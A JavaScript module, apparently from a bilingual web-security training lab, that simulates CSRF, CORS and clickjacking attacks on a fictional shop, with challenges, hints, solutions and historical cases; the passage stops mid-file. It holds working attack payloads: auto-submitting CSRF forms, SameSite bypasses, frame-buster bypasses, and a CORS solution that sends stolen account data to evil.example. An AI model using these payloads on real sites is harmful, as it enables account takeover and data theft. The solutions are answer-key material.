import { L, htmlExec, verdict } from './lib.js';

const neutral = (en, zh) => ({ verdict: 'neutral', message: L(en, zh) });
const SITE = 'shop.example';

/* ====================================================== CSRF */
const attr = (tag, name) => {
  const m = new RegExp(`\\s${name}\\s*=\\s*(?:"([^"]*)"|'([^']*)'|([^\\s>]+))`, 'i').exec(tag);
  return m ? (m[1] ?? m[2] ?? m[3]) : null;
};
/** Read an attacker page and work out which request the victim’s browser would send. */
function parseAttack(html) {
  const noRef = /<meta[^>]*name=["']?referrer["']?[^>]*content=["']?no-referrer/i.test(html);
  const push = /history\.pushState\([^,]*,[^,]*,\s*["']([^"']*)["']\)/.exec(html);
  const referer = noRef ? null : `https://evil.example${push ? (push[1].startsWith('/') ? push[1] : '/' + push[1]) : '/'}`;
  const form = /<form[^>]*>/i.exec(html);
  const nav = /(?:document\.)?location(?:\.href)?\s*=\s*["']([^"']+)["']/.exec(html);
  const img = /<img[^>]*\ssrc=["']([^"']+)["']/i.exec(html);
  if (form) {
    const params = new URLSearchParams();
    for (const m of html.matchAll(/<input[^>]*>/gi)) {
      const n = attr(m[0], 'name');
      if (n) params.append(n, attr(m[0], 'value') ?? '');
    }
    const auto = /\.submit\(\)|requestSubmit\(\)/.test(html);
    const method = (attr(form[0], 'method') || 'GET').toUpperCase();
    const action = attr(form[0], 'action') || '';
    let url;
    try {
      url = new URL(action);
    } catch {
      return { error: L('form action must be an absolute URL', 'form 的 action 必须是绝对 URL') };
    }
    if (method === 'GET') for (const [k, v] of params) url.searchParams.append(k, v);
    return { sent: auto, method, url, params: method === 'GET' ? url.searchParams : params, topLevel: true, referer };
  }
  if (nav) {
    try {
      const url = new URL(nav[1]);
      return { sent: true, method: 'GET', url, params: url.searchParams, topLevel: true, referer };
    } catch {
      return { error: L('bad URL', 'URL 无效') };
    }
  }
  if (img) {
    try {
      const url = new URL(img[1]);
      return { sent: true, method: 'GET', url, params: url.searchParams, topLevel: false, referer };
    } catch {
      return { error: L('bad URL', 'URL 无效') };
    }
  }
  return { error: L('no form, navigation or image found', '没有找到表单、跳转或图片') };
}
/** Browser cookie rules + server checks. */
function csrfServer(html, { sameSite = 'None', token = 'none', allowGet = false, methodOverride = false, referer = 'none' } = {}) {
  const a = parseAttack(html);
  if (a.error) return { log: [a.error], response: '(nothing sent)', changed: false };
  if (!a.sent) return { log: [L('the form never submits: add a script that calls submit()', '表单从未提交：加一段调用 submit() 的脚本')], response: '(nothing sent)', changed: false };
  const log = [];
  const cookieSent = sameSite === 'None' || (sameSite === 'Lax' && a.method === 'GET' && a.topLevel);
  log.push(L(`browser: ${a.method} ${a.url.pathname}${a.url.search} → cookie ${cookieSent ? 'sent' : `withheld (SameSite=${sameSite})`}`, `浏览器：${a.method} ${a.url.pathname}${a.url.search} → Cookie ${cookieSent ? '已发送' : `未发送（SameSite=${sameSite}）`}`));
  log.push(`Referer: ${a.referer ?? L('(none)', '（无）').en}`);
  const req = `${a.method} ${a.url.pathname}${a.method === 'GET' ? a.url.search : ''} HTTP/1.1\nHost: ${a.url.host}${cookieSent ? '\nCookie: session=victim-9c1e' : ''}${a.referer ? `\nReferer: ${a.referer}` : ''}${a.method === 'POST' ? `\n\n${a.params.toString()}` : ''}`;
  const fail = (en, zh) => ({ log: [...log, L(en, zh)], response: `${req}\n\n→ HTTP/1.1 400/401`, changed: false });
  if (a.url.host !== SITE || a.url.pathname !== '/my-account/change-email') return fail('wrong target', '目标不对');
  const effective = methodOverride && a.params.get('_method') ? a.params.get('_method').toUpperCase() : a.method;
  if (effective === 'GET' && !allowGet) return fail('GET not allowed on this endpoint', '该接口不允许 GET');
  if (!cookieSent) return fail('no session cookie → not logged in', '没有会话 Cookie → 未登录');
  if (referer === 'if-present' && a.referer && !a.referer.startsWith(`https://${SITE}/`)) return fail('Referer present and foreign → rejected', 'Referer 存在且来自外站 → 拒绝');
  if (referer === 'contains' && !(a.referer || '').includes(SITE)) return fail(`Referer does not contain ${SITE}`, `Referer 不包含 ${SITE}`);
  const t = a.params.get('csrf');
  if (token === 'session' && t !== 'victimTok-55') return fail('CSRF token missing or wrong', 'CSRF 令牌缺失或错误');
  if (token === 'present' && t !== null && t !== 'victimTok-55') return fail('CSRF token wrong', 'CSRF 令牌错误');
  if (token === 'pool' && !['victimTok-55', 'wTk-91x'].includes(t)) return fail('CSRF token not recognised', '无法识别 CSRF 令牌');
  if (token === 'post' && a.method === 'POST' && t !== 'victimTok-55') return fail('CSRF token missing (checked on POST)', '缺少 CSRF 令牌（POST 时检查）');
  const email = a.params.get('email');
  return { log: [...log, L(`email changed to ${email}`, `邮箱被改为 ${email}`)], response: `${req}\n\n→ HTTP/1.1 302 Found`, changed: Boolean(email) };
}
const FORM = (extra = '', method = 'POST') => `<form method="${method}" action="https://${SITE}/my-account/change-email">\n  <input name="email" value="pwned@evil.example">${extra}\n</form>\n<script>document.forms[0].submit()</script>`;
const CSRF_FIX = { label: L('Server', '服务器'), off: L('As described', '如上所述'), on: L('Session token + SameSite=Lax', '会话令牌 + SameSite=Lax') };
function csrfLab(rules, def, presets) {
  return {
    fields: [{ id: 'h', label: L('Attacker page (HTML)', '攻击者页面（HTML）'), rows: 5, default: def }],
    presets,
    defense: CSRF_FIX,
    run({ values, defended }) {
      const r = csrfServer(values.h, defended ? { sameSite: 'Lax', token: 'session' } : rules);
      return { request: L('victim opens https://evil.example/ while logged in to the shop', '受害者在已登录商店的情况下打开了 https://evil.example/'), log: r.log, response: r.response, ...(r.changed ? verdict(true, 'The victim’s email was changed by your page.', '受害者的邮箱被你的页面改掉了。') : defended ? verdict(false, 'No valid token, and the cookie isn’t sent cross-site.', '没有有效令牌，而且 Cookie 不会被跨站发送。') : neutral('Rejected.', '被拒绝了。')) };
    },
  };
}

const csrf = {
  variants: [
    {
      id: 'none',
      title: L('No defences', '毫无防御'),
      summary: L('The request relies only on the session cookie, which the browser attaches automatically (SameSite=None here).', '该请求只依赖会话 Cookie，而浏览器会自动带上它（这里是 SameSite=None）。'),
      lab: csrfLab({ sameSite: 'None' }, FORM(), [{ label: L('Auto-submit form', '自动提交表单'), values: { h: FORM() } }]),
    },
    {
      id: 'method',
      title: L('Token only checked on POST', '只在 POST 时检查令牌'),
      summary: L('The token is validated for POST, but the same handler also accepts GET, where nobody checks it.', 'POST 时会校验令牌，但同一个处理函数也接受 GET，而 GET 时没人检查。'),
      lab: csrfLab({ sameSite: 'None', token: 'post', allowGet: true }, FORM('', 'GET'), [
        { label: 'POST', values: { h: FORM() } },
        { label: 'GET', values: { h: FORM('', 'GET') } },
      ]),
    },
    {
      id: 'presence',
      title: L('Token checked only if present', '令牌存在时才检查'),
      summary: L('The server validates the token when the parameter exists, and skips validation when it’s missing. So leave it out.', '服务器在参数存在时校验令牌，缺失时则跳过校验。那就干脆别带。'),
      lab: csrfLab({ sameSite: 'None', token: 'present' }, FORM(), [
        { label: L('Wrong token', '错误令牌'), values: { h: FORM('\n  <input name="csrf" value="guess">') } },
        { label: L('No token', '不带令牌'), values: { h: FORM() } },
      ]),
    },
    {
      id: 'pool',
      title: L('Token not tied to the session', '令牌未绑定会话'),
      summary: L('The server keeps a pool of valid tokens but doesn’t check which user each belongs to. Log in as yourself, take your token, use it in the attack.', '服务器维护着一个有效令牌池，却不检查每个令牌属于哪个用户。用自己的账号登录，拿到自己的令牌，在攻击中使用它。'),
      lab: csrfLab({ sameSite: 'None', token: 'pool' }, FORM('\n  <input name="csrf" value="wTk-91x">'), [
        { label: L('No token', '不带令牌'), values: { h: FORM() } },
        { label: L('Your own token', '你自己的令牌'), values: { h: FORM('\n  <input name="csrf" value="wTk-91x">') } },
      ]),
    },
    {
      id: 'referer',
      title: L('Referer checked only if present', 'Referer 存在时才检查'),
      summary: L('The server rejects foreign Referers, but accepts requests with none. A meta tag tells the browser not to send one.', '服务器会拒绝外站 Referer，却接受没有 Referer 的请求。一个 meta 标签就能让浏览器不发送它。'),
      lab: csrfLab({ sameSite: 'None', referer: 'if-present' }, `<meta name="referrer" content="no-referrer">\n${FORM()}`, [
        { label: L('With Referer', '带 Referer'), values: { h: FORM() } },
        { label: 'no-referrer', values: { h: `<meta name="referrer" content="no-referrer">\n${FORM()}` } },
      ]),
    },
    {
      id: 'lax',
      title: L('SameSite=Lax via GET', '通过 GET 绕过 SameSite=Lax'),
      summary: L('Lax cookies are still sent on top-level GET navigations. If the framework lets _method=POST override a GET, Lax doesn’t help.', 'Lax Cookie 在顶层 GET 导航时仍会被发送。如果框架允许 _method=POST 覆盖 GET，Lax 就帮不上忙。'),
      lab: csrfLab({ sameSite: 'Lax', methodOverride: true }, `<script>\n  location = 'https://${SITE}/my-account/change-email?email=pwned@evil.example&_method=POST';\n</script>`, [
        { label: 'POST form', values: { h: FORM() } },
        { label: L('GET + _method', 'GET + _method'), values: { h: `<script>\n  location = 'https://${SITE}/my-account/change-email?email=pwned@evil.example&_method=POST';\n</script>` } },
      ]),
      takeaway: L('SameSite is defence in depth, not a replacement for tokens.', 'SameSite 是纵深防御，不是令牌的替代品。'),
    },
  ],
  challenges: [
    {
      title: L('No token, no problem', '没令牌也没问题'),
      goal: L('The change-email form includes a csrf parameter. Write an attacker page that changes the victim’s email to an address you control. Cookies are SameSite=None.', '修改邮箱的表单带有 csrf 参数。写一个攻击者页面，把受害者的邮箱改成你控制的地址。Cookie 是 SameSite=None。'),
      context: `POST /my-account/change-email HTTP/1.1\nHost: ${SITE}\nCookie: session=…\n\nemail=wiener%40normal-user.net&csrf=Fz2kE81`,
      fields: [{ id: 'h', label: L('Attacker page (HTML)', '攻击者页面（HTML）'), rows: 6, default: `<form method="POST" action="https://${SITE}/my-account/change-email">\n  <input name="email" value="pwned@evil.example">\n  <input name="csrf" value="Fz2kE81">\n</form>` }],
      run({ h }) {
        return csrfServer(h, { sameSite: 'None', token: 'present' });
      },
      check: (v, o) => o.changed,
      hint: L('Your token is wrong for the victim. What happens if the parameter isn’t there at all? Don’t forget to submit the form.', '你的令牌对受害者来说是错的。如果根本没有这个参数会怎样？别忘了提交表单。'),
      solution: FORM(),
      explain: L('Validation was skipped when the token was absent. A missing token must be treated exactly like a wrong one.', '令牌缺失时跳过了校验。缺失的令牌必须和错误的令牌同等对待。'),
    },
    {
      title: L('Borrow a valid token', '借一个有效令牌'),
      goal: L('Tokens are checked, but the server only asks “is this token in my list?”. Your own account’s current token is wTk-91x. Change the victim’s email.', '令牌会被检查，但服务器只问“这个令牌在我的列表里吗？”。你自己账号当前的令牌是 wTk-91x。修改受害者的邮箱。'),
      fields: [{ id: 'h', label: L('Attacker page (HTML)', '攻击者页面（HTML）'), rows: 6, default: FORM() }],
      run({ h }) {
        return csrfServer(h, { sameSite: 'None', token: 'pool' });
      },
      check: (v, o) => o.changed,
      hint: L('Add a hidden input named csrf with your own token.', '加一个名为 csrf 的隐藏输入框，填入你自己的令牌。'),
      solution: FORM('\n  <input name="csrf" value="wTk-91x">'),
      explain: L('A token proves nothing unless it is bound to the session that uses it. Store it in the session and compare against that.', '令牌只有绑定到使用它的会话上才有意义。把它存进会话，并与之比较。'),
    },
    {
      title: L('Beat SameSite=Lax', '击败 SameSite=Lax'),
      goal: L('The session cookie is now SameSite=Lax, so your POST form arrives without it. The framework supports a _method parameter to override the HTTP method. Change the victim’s email.', '会话 Cookie 现在是 SameSite=Lax，你的 POST 表单到达时不会带上它。框架支持用 _method 参数覆盖 HTTP 方法。修改受害者的邮箱。'),
      fields: [{ id: 'h', label: L('Attacker page (HTML)', '攻击者页面（HTML）'), rows: 6, default: FORM() }],
      run({ h }) {
        return csrfServer(h, { sameSite: 'Lax', methodOverride: true });
      },
      check: (v, o) => o.changed,
      hint: L('Lax cookies travel on top-level GET navigations. Navigate the victim with location = … and put everything, including _method=POST, in the query string.', 'Lax Cookie 会在顶层 GET 导航中发送。用 location = … 让受害者跳转，并把所有内容（包括 _method=POST）放进查询字符串。'),
      solution: `<script>\n  location = 'https://${SITE}/my-account/change-email?email=pwned@evil.example&_method=POST';\n</script>`,
      explain: L('The browser saw a harmless GET, the app ran a POST. State-changing actions should never be reachable with GET, and method overrides should be off.', '浏览器看到的是无害的 GET，应用执行的却是 POST。会改变状态的操作永远不该能用 GET 访问，方法覆盖也应关闭。'),
    },
  ],
  cases: [
    { year: '2007', ref: L('Gmail filters', 'Gmail 过滤器'), title: L('A stolen domain', '被偷走的域名'), what: L('A CSRF flaw let a malicious page silently create a filter in a logged-in victim’s Gmail that forwarded matching mail to the attacker. Designer David Airey reported losing his domain davidairey.com after registrar emails were forwarded this way.', '一个 CSRF 漏洞让恶意页面可以悄悄在已登录受害者的 Gmail 中创建一个过滤器，把匹配的邮件转发给攻击者。设计师 David Airey 报告称，域名注册商的邮件被这样转发后，他失去了自己的域名 davidairey.com。'), lesson: L('A “harmless” settings change can be the first step of an account takeover.', '一次“无害”的设置修改，可能就是账号接管的第一步。') },
    { year: '2008', ref: L('ING Direct (Zeller & Felten)', 'ING Direct（Zeller & Felten）'), title: L('Moving money with CSRF', '用 CSRF 转账'), what: L('Princeton researchers William Zeller and Edward Felten showed CSRF attacks on several major sites, including ING Direct, where an attacker could open an account in the victim’s name and transfer funds out of the victim’s account. The sites fixed the issues before publication.', '普林斯顿大学研究人员 William Zeller 和 Edward Felten 演示了对多个大型网站的 CSRF 攻击，其中包括 ING Direct：攻击者可以用受害者的名义开户，并把资金从受害者账户中转走。这些网站在论文发表前修复了问题。'), lesson: L('Every state-changing request needs proof of intent, not just a cookie.', '每个改变状态的请求都需要证明“用户确实想这么做”，而不只是一个 Cookie。') },
  ],
};

/* ====================================================== CORS */
function corsPolicy(origin, kind) {
  const o = origin.trim();
  switch (kind) {
    case 'reflect':
      return o ? o : null;
    case 'null':
      return o === 'null' || o === `https://${SITE}` ? o : null;
    case 'suffix':
      return /shop\.example$/.test(o) ? o : null;
    case 'prefix':
      return o.startsWith(`https://${SITE}`) ? o : null;
    case 'strict':
      return o === `https://${SITE}` ? o : null;
    default:
      return null;
  }
}
const attackerOrigin = (o) => {
  if (o.trim() === 'null') return true;
  try {
    const h = new URL(o).hostname;
    return h !== SITE && !h.endsWith(`.${SITE}`);
  } catch {
    return false;
  }
};
function corsRun(origin, kind) {
  const acao = corsPolicy(origin, kind);
  const headers = `HTTP/1.1 200 OK${acao ? `\nAccess-Control-Allow-Origin: ${acao}\nAccess-Control-Allow-Credentials: true` : ''}\n\n{"username":"carlos","apikey":"Cq7Vz2Lm"}`;
  const readable = Boolean(acao) && attackerOrigin(origin);
  return { request: `GET /accountDetails HTTP/1.1\nHost: ${SITE}\nOrigin: ${origin}\nCookie: session=carlos-…`, headers, readable };
}
const STRICT_CORS = { label: L('Policy', '策略'), off: L('As described', '如上所述'), on: L('Exact allowlist', '精确白名单') };
function corsLab(kind, def, presets) {
  return {
    fields: [{ id: 'o', label: 'Origin', default: def }],
    presets,
    defense: STRICT_CORS,
    run({ values, defended }) {
      const r = corsRun(values.o, defended ? 'strict' : kind);
      return { request: r.request, log: [r.readable ? L('browser lets the attacker’s script read the response', '浏览器允许攻击者的脚本读取响应') : L('browser blocks the read (no matching ACAO for this origin)', '浏览器阻止读取（ACAO 与该来源不匹配）')], response: r.headers, ...(r.readable ? verdict(true, 'An attacker page reads carlos’s API key with his cookies.', '攻击者页面带着 carlos 的 Cookie 读到了他的 API 密钥。') : defended ? verdict(false, 'Only https://shop.example is allowed.', '只允许 https://shop.example。') : neutral('Not readable from this origin.', '这个来源读不到。')) };
    },
  };
}

const cors = {
  variants: [
    {
      id: 'reflect',
      title: L('Reflected Origin', '回显 Origin'),
      summary: L('The server copies whatever Origin it receives into Access-Control-Allow-Origin, with credentials allowed. Every site on the internet is “trusted”.', '服务器把收到的任何 Origin 原样复制进 Access-Control-Allow-Origin，并且允许携带凭证。互联网上每个网站都“受信任”。'),
      lab: corsLab('reflect', 'https://evil.example', [
        { label: `https://${SITE}`, values: { o: `https://${SITE}` } },
        { label: 'https://evil.example', values: { o: 'https://evil.example' } },
      ]),
    },
    {
      id: 'null',
      title: L('Trusting null', '信任 null'),
      summary: L('Developers allow Origin: null for local files. Sandboxed iframes also send null, and anyone can create one.', '开发者为本地文件允许 Origin: null。可沙箱化的 iframe 也会发送 null，而任何人都能创建一个。'),
      lab: corsLab('null', 'null', [
        { label: 'https://evil.example', values: { o: 'https://evil.example' } },
        { label: 'null', values: { o: 'null' } },
      ]),
    },
    {
      id: 'suffix',
      title: L('Suffix match', '后缀匹配'),
      summary: L('The check is “ends with shop.example”. So does notshop.example, which anyone can register.', '检查规则是“以 shop.example 结尾”。notshop.example 也满足，而任何人都能注册它。'),
      lab: corsLab('suffix', 'https://notshop.example', [
        { label: `https://api.${SITE}`, values: { o: `https://api.${SITE}` } },
        { label: 'https://notshop.example', values: { o: 'https://notshop.example' } },
      ]),
    },
    {
      id: 'prefix',
      title: L('Prefix match', '前缀匹配'),
      summary: L('The check is “starts with https://shop.example”. A domain such as shop.example.evil.net passes.', '检查规则是“以 https://shop.example 开头”。像 shop.example.evil.net 这样的域名也能通过。'),
      lab: corsLab('prefix', `https://${SITE}.evil.net`, [
        { label: 'https://evil.example', values: { o: 'https://evil.example' } },
        { label: `https://${SITE}.evil.net`, values: { o: `https://${SITE}.evil.net` } },
      ]),
      takeaway: L('Compare origins as exact strings from a list. Never use regexes or substring checks.', '用列表中的精确字符串比较来源。永远不要用正则或子串检查。'),
    },
  ],
  challenges: [
    {
      title: L('Find the hole in the regex', '找出正则的漏洞'),
      goal: L('The server allows origins matching /shop\\.example$/. Give an Origin you could register yourself that the server will trust with credentials.', '服务器允许匹配 /shop\\.example$/ 的来源。给出一个你自己可以注册、且服务器会带凭证信任的 Origin。'),
      fields: [{ id: 'o', label: 'Origin', default: `https://${SITE}` }],
      run({ o }) {
        const r = corsRun(o, 'suffix');
        return { log: [attackerOrigin(o) ? L('origin is outside shop.example', '来源不属于 shop.example') : L('that origin belongs to the shop itself', '这个来源属于商店自身')], response: r.headers, ok: r.readable };
      },
      check: (v, o) => o.ok,
      hint: L('The regex has no anchor before “shop”. Put letters in front.', '这个正则在“shop”前面没有锚点。在前面加几个字母。'),
      solution: 'https://notshop.example',
      explain: L('“Ends with shop.example” includes notshop.example. Even the dot is a wildcard unless escaped. Use an exact list.', '“以 shop.example 结尾”包括 notshop.example。点号如果不转义也是通配符。用精确列表。'),
    },
    {
      title: L('Become null', '变成 null'),
      goal: L('The API trusts Origin: null with credentials. Write an attacker page whose request will carry Origin: null and read /accountDetails with the victim’s cookies.', '该 API 带凭证信任 Origin: null。写一个攻击者页面，让它的请求携带 Origin: null，并带着受害者的 Cookie 读取 /accountDetails。'),
      fields: [{ id: 'h', label: L('Attacker page (HTML)', '攻击者页面（HTML）'), rows: 6, default: `<script>\n  fetch('https://${SITE}/accountDetails')\n    .then(r => r.text())\n    .then(t => location = 'https://evil.example/log?' + encodeURIComponent(t));\n</script>` }],
      run({ h }) {
        const sandbox = /<iframe[^>]*\ssandbox=["'][^"']*allow-scripts[^"']*["']/i.test(h) && !/allow-same-origin/i.test(h);
        const creds = /credentials\s*:\s*["']include["']|withCredentials\s*=\s*true/.test(h);
        const origin = sandbox ? 'null' : 'https://evil.example';
        const r = corsRun(origin, 'null');
        return { log: [L(`request Origin: ${origin}`, `请求的 Origin：${origin}`), creds ? L('credentials included', '已携带凭证') : L('no credentials: cookies not sent', '未携带凭证：Cookie 不会发送')], response: r.headers, ok: r.readable && creds };
      },
      check: (v, o) => o.ok,
      hint: L('Wrap the script in <iframe sandbox="allow-scripts" srcdoc="…">, and pass credentials: \'include\' to fetch.', '把脚本包进 <iframe sandbox="allow-scripts" srcdoc="…">，并给 fetch 传 credentials: \'include\'。'),
      solution: `<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://${SITE}/accountDetails',{credentials:'include'}).then(r=>r.text()).then(t=>top.location='https://evil.example/log?'+encodeURIComponent(t))</script>"></iframe>`,
      explain: L('null is not a private origin; sandboxed documents, data: URLs and redirects all produce it. Never allow null with credentials.', 'null 并不是一个私有来源；沙箱化文档、data: URL 和重定向都会产生它。永远不要带凭证允许 null。'),
    },
  ],
  cases: [
    { year: '2016', ref: L('James Kettle (PortSwigger)', 'James Kettle（PortSwigger）'), title: L('CORS for Bitcoins and bounties', '用 CORS 换比特币和赏金'), what: L('In his research “Exploiting CORS misconfigurations for Bitcoins and bounties”, James Kettle found many sites, including Bitcoin exchanges, that reflected arbitrary origins or trusted null with credentials, letting any website read users’ private data and API keys.', '在研究“Exploiting CORS misconfigurations for Bitcoins and bounties”中，James Kettle 发现许多网站（包括比特币交易所）会回显任意来源或带凭证信任 null，使任何网站都能读取用户的私密数据和 API 密钥。'), lesson: L('CORS relaxes the same-origin policy. Misconfigured, it removes it.', 'CORS 放宽了同源策略。配置错了，就等于把它拆了。') },
  ],
};

/* ====================================================== Clickjacking */
const BTN = { x: 420, y: 510, w: 120, h: 40 }; // "Delete account" inside the framed page
const DECOY = { x: 100, y: 320 }; // where the victim clicks on the attacker page
const FRAME_FIX = { label: L('Target site', '目标网站'), off: L('No framing policy', '无嵌套策略'), on: "CSP frame-ancestors 'none'" };
function lands(left, top) {
  const cx = DECOY.x - left;
  const cy = DECOY.y - top;
  return cx >= BTN.x && cx <= BTN.x + BTN.w && cy >= BTN.y && cy <= BTN.y + BTN.h;
}

const clickjacking = {
  variants: [
    {
      id: 'basic',
      title: L('Basic overlay', '基础覆盖'),
      summary: L('Frame the target transparently and line its button up under your decoy. The victim clicks “Win a prize” and actually clicks “Delete account”.', '把目标页面透明地嵌入，把它的按钮对准你的诱饵。受害者点击“赢取奖品”，实际上点的是“删除账号”。'),
      lab: {
        fields: [
          { id: 'l', label: L('iframe left (px)', 'iframe left（px）'), default: '-340' },
          { id: 't', label: L('iframe top (px)', 'iframe top（px）'), default: '-210' },
        ],
        presets: [
          { label: L('Unaligned', '未对齐'), values: { l: '0', t: '0' } },
          { label: L('Aligned', '已对齐'), values: { l: '-340', t: '-210' } },
        ],
        defense: FRAME_FIX,
        run({ values, defended }) {
          const l = parseInt(values.l, 10) || 0;
          const t = parseInt(values.t, 10) || 0;
          if (defended) return { request: `<iframe src="https://${SITE}/my-account" style="opacity:0.0001;left:${l}px;top:${t}px">`, log: [L("browser refuses to render the page in a frame (frame-ancestors 'none')", "浏览器拒绝在框架中渲染该页面（frame-ancestors 'none'）")], response: '(empty frame)', ...verdict(false, 'Nothing to click through to.', '没有东西可以被点穿。') };
          const hit = lands(l, t);
          return { request: `<iframe src="https://${SITE}/my-account" style="opacity:0.0001;left:${l}px;top:${t}px">`, log: [L(`victim clicks decoy at (${DECOY.x}, ${DECOY.y}) → frame point (${DECOY.x - l}, ${DECOY.y - t})`, `受害者点击诱饵 (${DECOY.x}, ${DECOY.y}) → 框架内坐标 (${DECOY.x - l}, ${DECOY.y - t})`)], response: hit ? 'POST /my-account/delete → 302 "Account deleted"' : L('(click landed on empty space)', '（点击落在空白处）').en, ...(hit ? verdict(true, 'The invisible button took the click.', '隐形按钮接住了这次点击。') : neutral('Missed the button.', '没对准按钮。')) };
        },
      },
    },
    {
      id: 'prefill',
      title: L('Prefilled form', '预填表单'),
      summary: L('If a form reads values from the URL (?email=…), the attacker fills it in and the victim’s click only has to press Update.', '如果表单会从 URL 读取值（?email=…），攻击者就能把它填好，受害者只需点一下 Update。'),
      lab: {
        fields: [{ id: 'src', label: 'iframe src', default: `https://${SITE}/my-account?email=pwned@evil.example` }],
        presets: [
          { label: L('No prefill', '不预填'), values: { src: `https://${SITE}/my-account` } },
          { label: L('Prefilled', '预填'), values: { src: `https://${SITE}/my-account?email=pwned@evil.example` } },
        ],
        defense: FRAME_FIX,
        run({ values, defended }) {
          if (defended) return { request: `<iframe src="${values.src}">`, log: [], response: '(empty frame)', ...verdict(false, 'Cannot be framed.', '无法被嵌套。') };
          let email = null;
          try {
            email = new URL(values.src).searchParams.get('email');
          } catch {
            email = null;
          }
          return { request: `<iframe src="${values.src}">`, log: [L(`form value: ${email ?? '(your current email)'}`, `表单值：${email ?? '（你当前的邮箱）'}`)], response: email ? `POST /my-account/change-email  email=${email}` : 'POST /my-account/change-email  email=wiener@normal-user.net', ...(email ? verdict(true, 'One click changed the email to the attacker’s.', '一次点击就把邮箱改成了攻击者的。') : neutral('Click submits the existing email.', '点击提交的是原有邮箱。')) };
        },
      },
    },
    {
      id: 'buster',
      title: L('Frame-buster bypass', '绕过防嵌套脚本'),
      summary: L('Old sites use JavaScript like if (top !== self) top.location = self.location. A sandboxed iframe without allow-scripts never runs it, but allow-forms still lets the form submit.', '老网站用类似 if (top !== self) top.location = self.location 的 JavaScript。不带 allow-scripts 的沙箱 iframe 根本不会运行它，而 allow-forms 仍允许表单提交。'),
      lab: {
        fields: [{ id: 'f', label: L('iframe tag', 'iframe 标签'), default: `<iframe sandbox="allow-forms" src="https://${SITE}/my-account">` }],
        presets: [
          { label: L('Plain iframe', '普通 iframe'), values: { f: `<iframe src="https://${SITE}/my-account">` } },
          { label: 'sandbox="allow-forms"', values: { f: `<iframe sandbox="allow-forms" src="https://${SITE}/my-account">` } },
        ],
        defense: FRAME_FIX,
        run({ values, defended }) {
          if (defended) return { request: values.f, log: [], response: '(empty frame)', ...verdict(false, 'HTTP headers can’t be sandboxed away.', 'HTTP 响应头没法被沙箱绕掉。') };
          const sb = /\ssandbox(\s*=\s*["']([^"']*)["'])?/i.exec(values.f);
          const tokens = sb ? (sb[2] || '').split(/\s+/) : null;
          const scripts = !tokens || tokens.includes('allow-scripts');
          const forms = !tokens || tokens.includes('allow-forms');
          const busted = scripts && (!tokens || tokens.includes('allow-top-navigation'));
          return { request: values.f, log: [scripts ? L('frame-buster runs', '防嵌套脚本运行') : L('scripts disabled: frame-buster never runs', '脚本被禁用：防嵌套脚本从未运行'), forms ? L('forms allowed', '允许表单') : L('forms blocked', '表单被阻止')], response: busted ? L('top window navigated to the real site: attack page gone', '顶层窗口跳转到真实网站：攻击页面消失').en : forms ? 'Click → form submits' : 'Click → nothing', ...(!busted && forms ? verdict(true, 'The defence was JavaScript, and you turned JavaScript off.', '防御靠的是 JavaScript，而你关掉了 JavaScript。') : neutral(busted ? 'Busted out of the frame.' : 'Forms are blocked too.', busted ? '被跳出了框架。' : '表单也被阻止了。')) };
        },
      },
    },
  ],
  challenges: [
    {
      title: L('Line it up', '对准它'),
      goal: L(`On your page the decoy “Click me” sits at (${DECOY.x}, ${DECOY.y}). Inside the framed account page, “Delete account” occupies x ${BTN.x}–${BTN.x + BTN.w}, y ${BTN.y}–${BTN.y + BTN.h}. Position the iframe so the victim’s click deletes the account.`, `在你的页面上，诱饵“Click me”位于 (${DECOY.x}, ${DECOY.y})。在被嵌入的账号页面里，“Delete account”占据 x ${BTN.x}–${BTN.x + BTN.w}、y ${BTN.y}–${BTN.y + BTN.h}。调整 iframe 位置，让受害者的点击删除账号。`),
      fields: [
        { id: 'l', label: L('iframe left (px)', 'iframe left（px）'), default: '0' },
        { id: 't', label: L('iframe top (px)', 'iframe top（px）'), default: '0' },
      ],
      run({ l, t }) {
        const L0 = parseInt(l, 10) || 0;
        const T0 = parseInt(t, 10) || 0;
        const hit = lands(L0, T0);
        return { log: [L(`click lands at frame point (${DECOY.x - L0}, ${DECOY.y - T0})`, `点击落在框架内坐标 (${DECOY.x - L0}, ${DECOY.y - T0})`)], response: hit ? 'POST /my-account/delete → "Account deleted"' : '(missed)', hit };
      },
      check: (v, o) => o.hit,
      hint: L('frame point = decoy − iframe offset. So offset = decoy − button point. Both numbers are negative.', '框架内坐标 = 诱饵坐标 − iframe 偏移。所以偏移 = 诱饵坐标 − 按钮坐标。两个数都是负的。'),
      solution: 'left = -380, top = -210 (any left from -440 to -320 and top from -230 to -190 works)',
      explain: L('Clickjacking is just geometry plus an invisible frame. The fix is to forbid framing: CSP frame-ancestors (and X-Frame-Options for old browsers).', '点击劫持只是几何计算加上一个隐形框架。修复方法是禁止被嵌套：CSP frame-ancestors（老浏览器用 X-Frame-Options）。'),
    },
    {
      title: L('Defeat the frame-buster', '击败防嵌套脚本'),
      goal: L('The account page runs a frame-busting script and sets no headers. Write an iframe tag that keeps the page framed while its email form can still be submitted.', '账号页面运行防嵌套脚本，但没有设置任何响应头。写一个 iframe 标签，让页面保持在框架内，同时它的邮箱表单仍能提交。'),
      fields: [{ id: 'f', label: L('iframe tag', 'iframe 标签'), default: `<iframe src="https://${SITE}/my-account?email=pwned@evil.example">` }],
      run({ f }) {
        const sb = /\ssandbox(\s*=\s*["']([^"']*)["'])?/i.exec(f);
        const tokens = sb ? (sb[2] || '').split(/\s+/) : null;
        const scripts = !tokens || tokens.includes('allow-scripts');
        const forms = !tokens || tokens.includes('allow-forms');
        return { log: [scripts ? L('frame-buster runs → page escapes the frame', '防嵌套脚本运行 → 页面跳出框架') : L('frame-buster disabled', '防嵌套脚本被禁用'), forms ? L('forms allowed', '允许表单') : L('forms blocked', '表单被阻止')], response: !scripts && forms ? 'Click → email changed' : '(attack fails)', ok: !scripts && forms };
      },
      check: (v, o) => o.ok,
      hint: L('The sandbox attribute disables everything, then you add back only what you need.', 'sandbox 属性会禁用一切，然后你只把需要的东西加回来。'),
      solution: `<iframe sandbox="allow-forms" src="https://${SITE}/my-account?email=pwned@evil.example">`,
      explain: L('Defences written in the page’s own JavaScript can be switched off by the framing page. Use response headers, which the browser enforces before any script runs.', '写在页面自身 JavaScript 里的防御，可以被外层页面关掉。使用响应头，浏览器会在任何脚本运行之前强制执行它们。'),
    },
  ],
  cases: [
